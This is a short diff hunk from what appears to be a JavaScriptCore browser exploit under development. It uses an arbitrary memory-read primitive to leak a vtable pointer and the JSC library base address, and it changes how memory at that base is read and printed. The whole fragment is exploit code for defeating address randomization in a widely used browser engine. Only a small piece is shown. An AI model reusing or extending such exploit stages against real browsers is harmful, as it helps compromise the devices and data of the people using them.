@@ -630,9 +630,9 @@ for (var i = 0; i < 1000; ++i) {
         var jscbase = stage2.read64(vtable);
         print("vtable @ " + hex1(vtable));
         print("JSC instance @ " + hex1(jscbase))
-        var header = Sub(jscbase, new Int64(jscbase).lo() & 0xfff);
-        print("JSC header @" + header);
-        print(String.fromCharCode(...stage2.read(header, 0x10)));
+        //var header = Sub(jscbase, new Int64(jscbase).lo() & 0xfff);
+        //print("JSC header @" + header);
+        print(String.fromCharCode(...stage2.read(jscbase, 0x10)));
         /*print("object address?" + hex1(bbaddr));
         var vm = stage2.read64((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000) + 0x4000 - 0x120) //should poin
         print("JSC::VM Struct @" + hex1(vm));
